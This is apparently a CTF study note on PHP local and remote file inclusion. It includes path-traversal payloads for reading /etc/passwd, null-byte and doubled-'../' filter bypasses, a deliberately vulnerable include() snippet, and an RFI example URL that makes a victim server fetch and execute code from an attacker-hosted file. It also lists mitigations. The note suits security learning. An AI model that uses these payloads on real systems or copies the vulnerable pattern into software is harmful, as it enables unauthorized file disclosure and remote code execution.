---
title: File Inclusion
author: Throupy
date: 2024-06-09 00:00:00 +0000
categories: [CTF]
tags: [CTF, Web]
---

Also known as directory traversal, file inclusion is a vulnerability which allows an attacker to read operating system resources, such as local files on the server. This vulnerability is exploited by manipulating and abusing the web application’s URL to locate and access files stored outside of the application’s root directory.

File inclusion occurs when un-sanitised user input is passed to a function such as PHP’s `file_get_contents`. However the function is not the only facilitator of the issue. Often poor input validation / filtering is the cause of the vulnerability.

[PHP: file_get_contents - Manual](https://www.php.net/manual/en/function.file-get-contents.php)

Using `../../../etc/passwd` is a common way of testing for file inclusion, for example:

1. There is a URL `https://site.com/get.php?file=<FILE_NAME>`
2. The site expects a file parameter like “file.txt” or something inconspicuous.
3. The attacker can leverage this and make the application go up to the root directory by using `../`, and then get whatever file they want from the server.

## Local File Inclusion - PHP
[Good Wordlist here](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
Once again picking on PHP, there are functions such as `include`, `include_once`, `require` and `require_once` which include files from the local filesystem. For example:
```php
<?PHP
	include($_GET["lang"]);
?>
```
This would get the “lang” parameter from the URL. Assume this parameter would be `english.php` for the English site, or `spanish.php` for the Spanish site. As previously discussed, an attacked could use a payload of `../../../etc/passwd` to include that file, and therefore retrieve the contents. This works because in the above code snippet, no directory is passed to the include function, and there is no validation of the user’s parameter input.

In the above examples, we have the source code to look at, but in a black box test, it’s important to know the signs of a possible file inclusion vulnerability. A sign in a PHP application would be:
```php
Warning: include(languages/LOL.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
The message discloses important information - we can tell that the application appends `.php` onto the parameter (`LOL.php`), and looks for the file inside the `languages` directory. We can also see that the application directory is `/var/www/html/THM-4/`

So to read `/etc/passwd`, we could try the parameter as `../../../../etc/passwd` (note: 4 x `../` because 4 levels to application directory). However this wouldn’t work, as the application appends the `.php` onto the end, and the file `/etc/passwd.php` doesn’t exist. To get around this, we can use null bytes (0x00 / %00), which basically tells the application to disregard any following text.

The payload would look like: `../../../../../etc/passwd%00`.

NOTE: THE NULL BYTE TRICK IS FIXED IN PHP V5.3.4 AND ABOVE

Be careful of encoding e.g. URL encoding when submitting forms, maybe better to just use the URL or send a request manually.

### Avoiding String Filtering
If the developer adds some string filtering to replace `../` string with an empty string, you can simply double the payload, so it would be:
`....//....//....//....//....//etc/passwd`. This is because the PHP filter only matches the replaces the first subset string `../` it finds and doesn’t do another passwd, as shown below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png)

## Remote File Inclusion - PHP
RFI is a technique used to include remote files into a vulnerable application. Similar to LFI, RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into the `include` function. +

A requirement for RFI is that the `allow_url_fopen` option need to be `on`

The risk of RFI is higher than that of LFI, as RFI can allow an attacker gain remote code execution on the server. The RFI process is roughly as follows:

1. Attacker hosts malicious file ([site.com/bad_command.txt](http://site.com/bad_command.txt))
2. Attacker sends a payload including the location of the bad file-
    1. e.g. `http://victim.com/get.php?file=http://site.com/bad_command.txt`
3. The victim server retrieves the malicious file which is being hosted by the attacker
4. `bad_command.txt` is injected into the `include` function and executed.
5. The victim server sends back the result of the execution.

## Mitigation
1. Keep system, services and web app frameworks up to date
2. Turn of PHP errors to avoid leaking the application path
3. Web application firewalls
4. Disable PHP features that cause file inclusion (`allow_url_fopen`, `allow_url_include`)
5. Carefully analyze web application and only allow needed protocols and PHP wrappers
6. Never trust user input - SANITIZE!
7. Implement whitelisting for file names and locations (and also black listing)
